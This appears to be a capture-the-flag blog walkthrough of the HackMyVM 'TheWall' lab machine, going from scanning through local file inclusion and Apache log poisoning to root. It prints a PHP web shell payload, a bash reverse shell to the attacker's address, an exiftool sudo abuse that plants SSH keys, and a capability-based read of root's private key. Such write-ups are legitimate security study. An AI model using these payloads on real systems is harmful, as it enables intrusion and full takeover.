---
layout: post
title: "HackMyVM - TheWall"
date: 2022-10-25 15:47:00 +0100
categories: hmv
tag: ["LFI", "LogPoison"]
---

Creator: [Claor](https://hackmyvm.eu/profile/?user=Claor)
Level: Easy
Release Date: 2022-10-21

## Scan & Enumeration

```bash
# Nmap 7.93 scan initiated Sat Oct 25 21:00:53 2022 as: nmap -sC -sV -oA nmap/TheWall -p- 192.168.1.24
Nmap scan report for 192.168.1.24
Host is up (0.00043s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 896029db686d133498b9d0172456a89e (RSA)
|   256 6658516dcd3a674636569a31a00813cf (ECDSA)
|_  256 f7349e5368bac206ab14c321902d6e64 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 25 21:01:04 2022 -- 1 IP address (1 host up) scanned in 10.48 seconds
```

### GoBuster

```bash
$ gobuster dir -u "http://192.168.1.24" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php --delay 1s -t 1 -b 403,404 
```

```bash
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.24
[+] Method:                  GET
[+] Threads:                 1
[+] Delay:                   1s
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/10/25 18:58:08 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 25]
/includes.php         (Status: 200) [Size: 2]
===============================================================
2022/10/25 19:22:09 Finished
===============================================================
```

### LFI (includes.php)

```
$ wfuzz -c --hc=404 --hh=2 -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://192.168.1.24/includes.php?FUZZ=/etc/passwd'
```

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.24/includes.php?FUZZ=/etc/passwd
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                               
=====================================================================

000217299:   200        28 L     41 W       1460 Ch     "display_page"                                                                                        

Total time: 524.4431
Processed Requests: 220560
Filtered Requests: 220559
Requests/sec.: 420.5603
```

* LFI : http://192.168.1.24/includes.php?display_page=<FILE>

## Log Poisoning - (netcat)

```bash
nc 192.168.1.24 80
GET <?php system($_GET['cmd']); ?>

HTTP/1.1 400 Bad Request
Date: Fri, 25 Oct 2022 19:20:36 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 307
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at TheWall.TheWall Port 80</address>
</body></html>
```

## Log Poisoning - (burp)

<img src="https://drive.google.com/uc?id=11iqjx6nMkqK_XPAswtZG20UedK_iV-bf"/>

## Reverse Shell

```
http://192.168.1.24/includes.php?display_page=/var/log/apache2/access.log&cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.1.26/4444 0>%261'
```

```bash
$ nc -lvnp 4444     
listening on [any] 4444 ...
connect to [192.168.1.26] from (UNKNOWN) [192.168.1.24] 41902
bash: cannot set terminal process group (425): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheWall:/var/www/html$
```

## Lateral Movement (www-data > john)

```bash
www-data@TheWall:/var/www$ sudo -l
Matching Defaults entries for www-data on TheWall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on TheWall:
    (john : john) NOPASSWD: /usr/bin/exiftool
www-data@TheWall:/var/www$ 
```

* Copy (local) id_rsa.pub > authorized_keys

```bash
www-data@TheWall:/tmp$ sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/id_rsa.pub
<ame=/home/john/.ssh/authorized_keys /tmp/id_rsa.pub
Warning: Error removing old file - /tmp/id_rsa.pub
    1 image files updated
www-data@TheWall:/tmp$ 
```

```
$ ssh john@192.168.1.24                                        
Linux TheWall 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
Last login: Wed Oct 19 17:07:17 2022 from 10.0.2.15
john@TheWall:~$ 
```

## ROOT - [cap_dac_read_search](https://tbhaxor.com/exploiting-linux-capabilities-part-2/)


```bash
john@TheWall:~$ find / -group 1000 2>/dev/null
...
/usr/sbin/tar

john@TheWall:~$ ls -la /usr/sbin/tar
-rwxr-xr-- 1 root john 531928 Oct 19 17:09 /usr/sbin/tar

john@TheWall:~$ /sbin/getcap -r /usr/sbin/tar 2>/dev/null
/usr/sbin/tar cap_dac_read_search=ep
```

```bash
john@TheWall:/$ ls -la
total 76
...
-rw-------   1 root root  2602 Oct 19 19:37 id_rsa
-rw-r--r--   1 root root   566 Oct 19 19:37 id_rsa.pub
...
john@TheWall:/$ 
```

```bash
john@TheWall:/tmp$ /sbin/tar cf id_rsa.tar /id_rsa
/sbin/tar: Removing leading `/' from member names

john@TheWall:/tmp$ tar xf id_rsa.tar
john@TheWall:/tmp$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvgS2V50JB5doFy4G99JzapbZWie7kLRHGrsmRk5uZPFPPtH/m9xS
[REDACTED]
/2Jia/yz6Rju7pTIL2q93asuJK6JrCm9ynj7u9GjEIuruXQpgKOl7Vj3IA48WWzxI/11V3
kwidXsel+Zgj8AAAAMcm9vdEBUaGVXYWxsAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
john@TheWall:/tmp$ 
```

```bash
ohn@TheWall:/tmp$ ssh -i id_rsa root@127.0.0.1
Linux TheWall 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
Last login: Wed Oct 19 19:51:15 2022 from 10.0.2.15
root@TheWall:~# whoami
root
root@TheWall:~#
```
